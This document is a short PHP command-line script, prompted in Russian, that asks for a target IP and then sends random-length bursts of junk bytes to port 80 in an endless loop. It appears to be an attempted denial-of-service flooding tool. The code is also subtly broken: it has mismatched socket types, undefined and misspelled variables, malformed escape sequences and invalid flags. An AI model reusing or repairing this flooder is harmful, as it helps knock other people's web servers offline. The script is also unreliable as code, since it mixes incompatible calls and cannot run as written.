<?php

echo "[!] Введите IP: ". PHP_EOL;
echo "» ";
$address = fgets(STDIN);

$httpclient = new HttpClient(trim($address));
$httpclient->run();

class HttpClient{
	public $ip;
	public $socket;
	public $connectionStatus = false;
	public function __construct(String $address) {
		$this->ip = $address;
		$this->socket = socket_create(AF_UNIX, SOCK_STREAM, SOL_TCP);
		stream_set_blocking($this->socket, true);
		stream_set_timeout($this->socket, 1);
		sleep(5);
		}
		public function run() {
			while(true) {
					$message = str_repeat("\jnX\x0\x\x12\x34\x96\x2048\x2048f\x8000b", mt_rand(1000, 5000));
					socket_sendto($this->socket, $messages, strlen($message), MSG_EOF, $this->adress, 80);
					}
					}
					}
					?>